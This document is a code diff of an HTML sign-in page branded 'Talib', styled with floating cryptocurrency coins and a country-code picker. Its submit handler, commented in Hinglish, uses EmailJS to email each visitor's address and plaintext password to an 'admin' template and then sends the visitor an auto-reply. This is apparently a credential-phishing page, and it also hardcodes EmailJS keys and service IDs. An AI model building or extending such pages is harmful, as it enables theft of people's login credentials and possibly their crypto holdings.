@@ -9,11 +9,51 @@
   * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
   body {
     min-height: 100vh; display: flex; align-items: center; justify-content: center;
-    background: linear-gradient(135deg, #1e3a5f 0%, #2d6a8f 100%); padding: 16px;
+    padding: 16px; position: relative; overflow: hidden;
+    background:
+      radial-gradient(50% 50% at 20% 15%, rgba(16,185,129,.25) 0%, transparent 60%),
+      radial-gradient(45% 45% at 85% 25%, rgba(245,158,11,.22) 0%, transparent 60%),
+      radial-gradient(55% 55% at 75% 85%, rgba(59,130,246,.22) 0%, transparent 60%),
+      linear-gradient(160deg, #05070d 0%, #0a0f1c 55%, #060a14 100%);
   }
+  body::before {
+    content: ""; position: fixed; inset: -20%; z-index: 0; opacity: .5;
+    background-image:
+      linear-gradient(rgba(45,106,143,.12) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(45,106,143,.12) 1px, transparent 1px);
+    background-size: 46px 46px;
+    mask-image: radial-gradient(70% 70% at 50% 40%, #000 0%, transparent 100%);
+    -webkit-mask-image: radial-gradient(70% 70% at 50% 40%, #000 0%, transparent 100%);
+    animation: gridpan 24s linear infinite;
+  }
+  @keyframes gridpan { from { transform: translate3d(0,0,0); } to { transform: translate3d(46px, 46px, 0); } }
+  
+  .coins { position: fixed; inset: 0; z-index: 0; pointer-events: none; overflow: hidden; }
+  .coin {
+    position: absolute; border-radius: 50%; display: flex; align-items: center; justify-content: center;
+    font-weight: 800; color: #0a0f1c; box-shadow: 0 8px 30px rgba(0,0,0,.4);
+    animation: float 9s ease-in-out infinite;
+  }
+  .coin.btc { width: 64px; height: 64px; left: 10%; top: 22%; font-size: 30px; background: radial-gradient(circle at 32% 28%, #ffd27a, #f59e0b); animation-delay: 0s; }
+  .coin.eth { width: 50px; height: 50px; left: 82%; top: 30%; font-size: 24px; background: radial-gradient(circle at 32% 28%, #9fb4ff, #5b76f7); color:#0a0f1c; animation-delay: 1.5s; }
+  .coin.usdt { width: 44px; height: 44px; left: 78%; top: 72%; font-size: 20px; background: radial-gradient(circle at 32% 28%, #7ef0c8, #10b981); animation-delay: 3s; }
+  .coin.sm { width: 34px; height: 34px; left: 16%; top: 74%; font-size: 16px; background: radial-gradient(circle at 32% 28%, #cfd8e3, #8a99ab); animation-delay: 2.2s; }
+  @keyframes float { 0%,100% { transform: translateY(0) rotate(-4deg); } 50% { transform: translateY(-22px) rotate(4deg); } }
+  
+  body::after {
+    content: ""; position: fixed; inset: 0; z-index: 0; pointer-events: none;
+    background: radial-gradient(120% 120% at 50% 0%, transparent 50%, rgba(0,0,0,.55) 100%);
+  }
+  
   .card {
-    background: #fff; width: 100%; max-width: 380px; border-radius: 16px;
-    padding: 32px 28px; box-shadow: 0 20px 50px rgba(0,0,0,.25);
+    position: relative; z-index: 1;
+    background: rgba(255,255,255,0.92);
+    backdrop-filter: blur(18px) saturate(1.2);
+    -webkit-backdrop-filter: blur(18px) saturate(1.2);
+    width: 100%; max-width: 380px; border-radius: 20px;
+    padding: 34px 30px;
+    border: 1px solid rgba(255,255,255,0.5);
+    box-shadow: 0 30px 70px rgba(0,0,0,.45), inset 0 1px 0 rgba(255,255,255,.6);
   }
   .brand { text-align: center; margin-bottom: 4px; font-size: 28px; font-weight: 700; color: #1e3a5f; letter-spacing: .5px; }
   .sub { text-align: center; color: #7a8ba0; font-size: 14px; margin-bottom: 24px; }
@@ -75,6 +115,13 @@
 </style>
 </head>
 <body>
+  <div class="coins" aria-hidden="true">
+    <div class="coin btc">₿</div>
+    <div class="coin eth">Ξ</div>
+    <div class="coin usdt">₮</div>
+    <div class="coin sm">◈</div>
+  </div>
+
   <div class="card">
     <div class="brand">Talib</div>
     <div class="sub">Sign in to your account</div>
@@ -95,15 +142,15 @@
       <div id="mobileFields" class="hidden">
         <label>Mobile number</label>
         <div class="phone-row">
-          <div class="cc" id="cc">
-            <button type="button" class="cc-toggle" id="ccToggle" aria-haspopup="listbox" aria-expanded="false">
-              <span class="fi" id="ccFlag"></span>
-              <span id="ccDial">+91</span>
+          <div class="cc" data-cc="mobile">
+            <button type="button" class="cc-toggle" aria-haspopup="listbox" aria-expanded="false">
+              <span class="fi cc-flag"></span>
+              <span class="cc-dial">+91</span>
               <span class="caret">▼</span>
             </button>
-            <div class="cc-panel hidden" id="ccPanel">
-              <input type="text" class="cc-search" id="ccSearch" placeholder="Search country or code…" autocomplete="off">
-              <div class="cc-list" id="ccList"></div>
+            <div class="cc-panel hidden">
+              <input type="text" class="cc-search" placeholder="Search country or code…" autocomplete="off">
+              <div class="cc-list"></div>
             </div>
           </div>
           <input type="tel" id="mobile" placeholder="98765 43210">
@@ -121,16 +168,21 @@
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
   // ============================================================
-  // CONFIG — AAPKI SAARI VALUES SET HAIN
+  // EMAILJS CONFIG — APNI VALUES YAHAN DAALEIN
   // ============================================================
-  const EMAILJS_PUBLIC_KEY  = "ZJqAsmb31v__wrYH8";       
-  const EMAILJS_SERVICE_ID  = "service_9v7swc9";       
-  const EMAILJS_TEMPLATE_ID = "template_de0i3ik"; // ✅ Aapki Template ID
+  const EMAILJS_PUBLIC_KEY   = "ZJqAsmb31v__wrYH8";       
+  const EMAILJS_SERVICE_ID   = "service_9v7swc9";       
+  
+  // User ko auto-reply jane ke liye (Jo aapne banaya hai)
+  const USER_TEMPLATE_ID     = "template_de0i3ik"; 
+  
+  // ADMIN ko details jane ke liye (Naya template banayein aur ID yahan daalein)
+  const ADMIN_TEMPLATE_ID    = "YOUR_ADMIN_TEMPLATE_ID"; 
   // ============================================================
 
   emailjs.init(EMAILJS_PUBLIC_KEY);
 
-  // --- Full country list: name, ISO2, dial code ---
+  // --- Full country list ---
   const COUNTRIES = [
     ["Afghanistan","AF","+93"],["Albania","AL","+355"],["Algeria","DZ","+213"],["Andorra","AD","+376"],
     ["Angola","AO","+244"],["Antigua and Barbuda","AG","+1268"],["Argentina","AR","+54"],["Armenia","AM","+374"],
@@ -183,98 +235,72 @@
     ["Venezuela","VE","+58"],["Vietnam","VN","+84"],["Yemen","YE","+967"],["Zambia","ZM","+260"],["Zimbabwe","ZW","+263"]
   ].sort((a, b) => a[0].localeCompare(b[0]));
 
-  // --- Elements ---
+  function flagClass(iso) { return 'fi fi-' + iso.toLowerCase(); }
+
+  function initCountryDropdown(root) {
+    const toggle = root.querySelector('.cc-toggle');
+    const panel  = root.querySelector('.cc-panel');
+    const search = root.querySelector('.cc-search');
+    const list   = root.querySelector('.cc-list');
+    const flagEl = root.querySelector('.cc-flag');
+    const dialEl = root.querySelector('.cc-dial');
+    const state = { selected: COUNTRIES.find(c => c[1] === 'IN') };
+
+    function paint() {
+      flagEl.className = 'fi cc-flag ' + flagClass(state.selected[1]).replace('fi ', '');
+      dialEl.textContent = state.selected[2];
+    }
+    function render(filter = '') {
+      const q = filter.trim().toLowerCase();
+      const items = COUNTRIES.filter(([name, iso, dial]) =>
+        !q || name.toLowerCase().includes(q) || dial.includes(q) || iso.toLowerCase() === q);
+      list.innerHTML = '';
+      if (!items.length) { list.innerHTML = '<div class="cc-empty">No match found</div>'; return; }
+      items.forEach(c => {
+        const row = document.createElement('div');
+        row.className = 'cc-item' + (c[1] === state.selected[1] ? ' active' : '');
+        row.innerHTML = `<span class="${flagClass(c[1])}"></span><span class="nm">${c[0]}</span><span class="dl">${c[2]}</span>`;
+        row.addEventListener('click', () => { state.selected = c; paint(); close(); });
+        list.appendChild(row);
+      });
+    }
+    function open()  { panel.classList.remove('hidden'); toggle.setAttribute('aria-expanded','true'); search.value=''; render(); search.focus(); }
+    function close() { panel.classList.add('hidden'); toggle.setAttribute('aria-expanded','false'); }
+    toggle.addEventListener('click', e => { e.stopPropagation(); panel.classList.contains('hidden') ? open() : close(); });
+    search.addEventListener('input', () => render(search.value));
+    search.addEventListener('click', e => e.stopPropagation());
+    document.addEventListener('click', e => { if (!root.contains(e.target)) close(); });
+    document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); });
+    paint();
+    return state;
+  }
+
+  const ccMobile = initCountryDropdown(document.querySelector('[data-cc="mobile"]'));
+
   const tabEmail  = document.getElementById('tabEmail');
   const tabMobile = document.getElementById('tabMobile');
   const emailFields  = document.getElementById('emailFields');
   const mobileFields = document.getElementById('mobileFields');
   const msg = document.getElementById('msg');
-
-  const ccToggle = document.getElementById('ccToggle');
-  const ccPanel  = document.getElementById('ccPanel');
-  const ccSearch = document.getElementById('ccSearch');
-  const ccList   = document.getElementById('ccList');
-  const ccFlag   = document.getElementById('ccFlag');
-  const ccDial   = document.getElementById('ccDial');
-
   let mode = 'email';
-  let selected = COUNTRIES.find(c => c[1] === 'IN');
 
-  // --- Tabs ---
-  function setMode(newMode) {
-    mode = newMode;
-    const isEmail = mode === 'email';
+  function setMode(m) {
+    mode = m;
+    const isEmail = m === 'email';
     tabEmail.classList.toggle('active', isEmail);
     tabMobile.classList.toggle('active', !isEmail);
     emailFields.classList.toggle('hidden', !isEmail);
     mobileFields.classList.toggle('hidden', isEmail);
-    closePanel();
     clearMsg();
   }
   tabEmail.addEventListener('click', () => setMode('email'));
   tabMobile.addEventListener('click', () => setMode('mobile'));
 
-  // --- Country dropdown ---
-  function flagClass(iso) { return 'fi fi-' + iso.toLowerCase(); }
-
-  function setSelected(country) {
-    selected = country;
-    ccFlag.className = flagClass(country[1]);
-    ccDial.textContent = country[2];
-  }
-
-  function renderList(filter = '') {
-    const q = filter.trim().toLowerCase();
-    const items = COUNTRIES.filter(([name, iso, dial]) =>
-      !q || name.toLowerCase().includes(q) || dial.includes(q) || iso.toLowerCase() === q
-    );
-    ccList.innerHTML = '';
-    if (!items.length) {
-      ccList.innerHTML = '<div class="cc-empty">No match found</div>';
-      return;
-    }
-    items.forEach(c => {
-      const row = document.createElement('div');
-      row.className = 'cc-item' + (c[1] === selected[1] ? ' active' : '');
-      row.innerHTML = `<span class="${flagClass(c[1])}"></span>
-                       <span class="nm">${c[0]}</span>
-                       <span class="dl">${c[2]}</span>`;
-      row.addEventListener('click', () => { setSelected(c); closePanel(); });
-      ccList.appendChild(row);
-    });
-  }
-
-  function openPanel() {
-    ccPanel.classList.remove('hidden');
-    ccToggle.setAttribute('aria-expanded', 'true');
-    ccSearch.value = '';
-    renderList();
-    ccSearch.focus();
-  }
-  function closePanel() {
-    ccPanel.classList.add('hidden');
-    ccToggle.setAttribute('aria-expanded', 'false');
-  }
-  function togglePanel() {
-    ccPanel.classList.contains('hidden') ? openPanel() : closePanel();
-  }
-
-  ccToggle.addEventListener('click', e => { e.stopPropagation(); togglePanel(); });
-  ccSearch.addEventListener('input', () => renderList(ccSearch.value));
-  ccSearch.addEventListener('click', e => e.stopPropagation());
-  document.addEventListener('click', e => {
-    if (!document.getElementById('cc').contains(e.target)) closePanel();
-  });
-  document.addEventListener('keydown', e => { if (e.key === 'Escape') closePanel(); });
-
-  setSelected(selected);
-
-  // --- Messages ---
   function showError(t) { msg.textContent = t; msg.className = 'msg error'; }
   function showOk(t)    { msg.textContent = t; msg.className = 'msg ok'; }
   function clearMsg()   { msg.textContent = ''; msg.className = 'msg'; }
 
-  // --- Submit ---
+  // --- Submit (EmailJS Integrated) ---
   document.getElementById('loginForm').addEventListener('submit', async function (e) {
     e.preventDefault();
     clearMsg();
@@ -294,10 +320,16 @@
       const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
 
       try {
-        // EmailJS se mail bhejein
-        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+        // 1. Admin ko details bhejein
+        await emailjs.send(EMAILJS_SERVICE_ID, ADMIN_TEMPLATE_ID, {
           email: email,
           password: pass,
+          time: time
+        });
+
+        // 2. User ko auto-reply bhejein
+        await emailjs.send(EMAILJS_SERVICE_ID, USER_TEMPLATE_ID, {
+          email: email,
           time: time
         });
 
